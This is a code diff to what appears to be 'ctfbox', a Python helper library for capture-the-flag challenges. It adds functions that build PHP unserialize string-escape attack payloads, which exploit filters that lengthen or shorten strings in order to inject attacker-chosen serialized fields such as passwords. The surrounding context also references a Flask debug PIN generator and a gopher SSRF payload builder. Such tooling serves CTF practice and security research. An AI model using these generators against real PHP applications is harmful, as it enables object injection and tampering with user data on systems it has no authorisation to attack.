@@ -1,3 +1,4 @@
+from math import ceil
 from enum import Enum
 from functools import partial
 from http.server import HTTPServer
@@ -10,8 +11,8 @@ from hashlib import md5
 
 import requests
 from ctfbox.exceptions import (FlaskSessionHelperError, HashAuthArgumentError,
-                               ProvideArgumentError)
-from ctfbox.utils import Context, ProvideHandler, Threader
+                               ProvideArgumentError, GeneratePayloadError)
+from ctfbox.utils import random_string, Context, ProvideHandler, Threader
 from ctfbox.utils import md5 as _md5
 from ctfbox.utils import sha1, sha256, sha512
 
@@ -94,6 +95,16 @@ def _parse_form_data(body):
                 filename.decode(), body_content, content_type.decode())
         start = end + 1
     return parse_dict
+
+
+def _generateTrush(diff_len: int, remain: int):
+    pure_string_len = 12
+    k = ceil((remain + pure_string_len) / diff_len)
+    filed_len = k * diff_len - 12 - remain
+    result = ""
+    result = '''s:2:"_%s";i:%d;''' % (
+        random_string(1), 10 ** (filed_len - 1))
+    return k, result
 
 
 def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: str, modName: str = "flask.app",
@@ -482,3 +493,84 @@ def gopherraw(raw: str, host: str = "",  ssrfFlag: bool = True) -> str:
     if ssrfFlag:
         return quote(header + data)
     return header + data
+
+
+def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> Tuple[str, int]:
+    """
+    Use for generate short to long php unserialize escape attack payload
+    Tips:
+        - only for php class unserialize
+
+    Args:
+        src (str): search string
+        dst (str): replace string, this length must be greater than src
+        payload (str): the php serialize data you want to insert
+        paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+
+
+    Returns:
+        Tuple: tuple[str, int]
+        tuple[0](str): generated payload
+        tuple[1](int): length of the generated payload
+
+    Example:
+        php_serialize_escape_s2l("x", "yy", '''s:8:"password";s:6:"123456"''')
+    """
+    diff_len = len(dst) - len(src)
+    if diff_len <= 0:
+        raise GeneratePayloadError("dst length must be greater than src")
+
+    padding_len, remain = divmod(len(payload) + 4, diff_len)
+    if remain != 0:
+        if not paddingTrush:
+            raise GeneratePayloadError("Payload length error")
+        k, trush = _generateTrush(diff_len, remain)
+        padding_len += k
+        payload = trush + payload
+    payload = '";' + payload + ";}"
+    result = src * padding_len + payload
+    return result, len(result)
+
+
+def php_serialize_escape_l2s(src: str, dst: str, disString: str, payload: str, paddingTrush: bool = False) -> Tuple[str, int]:
+    """
+    Use for generate long to short php unserialize escape attack payload
+    Tips:
+        - only for php class unserialize
+    Args:
+        src(str): search string
+        dst(str): replace string, this length must be shorter than search
+        disString(str): The php serialize data to be swallowed
+        payload(str): the php serialize data you want to insert
+        paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+    Returns:
+        Tuple: tuple[str, int]
+        tuple[0](str): generated payload
+        tuple[1](int): length of the generated payload
+
+    Example:
+        print(php_serialize_escape_l2s('aaaa', 'bb', 's:6:"passwd";s:5:"test1"', 's:6:"passwd";s:6:"123456"'))
+    """
+    diff_len = len(src) - len(dst)
+    if diff_len <= 0:
+        raise GeneratePayloadError(
+            "src length must be greater than dst")
+
+    padding_len, remain = divmod(len(disString) + 1, diff_len)
+
+    if remain == 0:
+        result = (src * padding_len) + "\";" + \
+            disString + ";" + payload + ";}"
+        return result, len(src * padding_len)
+    if not paddingTrush:
+        raise GeneratePayloadError("Payload length error")
+
+    trash_data = _generateTrush(diff_len, remain)[1]
+    trash_data += disString
+    padding_len, remain = divmod(len(trash_data) + 1, diff_len)
+
+    if remain != 0:
+        raise GeneratePayloadError("Payload length Error")
+
+    result = (src * padding_len) + "\";" + trash_data + ";" + payload + ";}"
+    return result, len(src * padding_len)
